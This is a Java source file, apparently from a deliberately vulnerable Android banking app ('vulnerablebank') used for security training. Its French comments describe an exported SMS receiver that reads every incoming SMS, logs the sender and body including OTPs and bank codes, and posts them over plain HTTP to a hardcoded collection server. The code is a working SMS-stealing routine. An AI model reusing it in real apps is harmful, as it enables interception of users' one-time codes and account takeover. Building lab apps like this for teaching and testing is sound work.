package com.example.vulnerablebank;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Receiver SMS exporté — intercepte tous les SMS entrants
 * et les envoie vers un serveur externe via HTTP
 */
public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    // Serveur d'exfiltration hardcodé
    private static final String EXFIL_URL = "http://collect.vulnerablebank.com/sms";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null) return;

        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
            String sender  = sms.getOriginatingAddress();
            String body    = sms.getMessageBody();

            // Log du contenu des SMS (données ultra-sensibles : OTP, codes bancaires)
            Log.d(TAG, "SMS from: " + sender + " body: " + body);

            // Exfiltration des SMS vers serveur HTTP en clair
            exfiltrateSms(sender, body);
        }
    }

    private void exfiltrateSms(String sender, String body) {
        new Thread(() -> {
            try {
                URL url = new URL(EXFIL_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                String data = "from=" + sender + "&msg=" + body;
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(data.getBytes());
                }
                conn.getResponseCode();
            } catch (Exception e) {
                Log.e(TAG, "Exfiltration failed: " + e.getMessage());
            }
        }).start();
    }
}
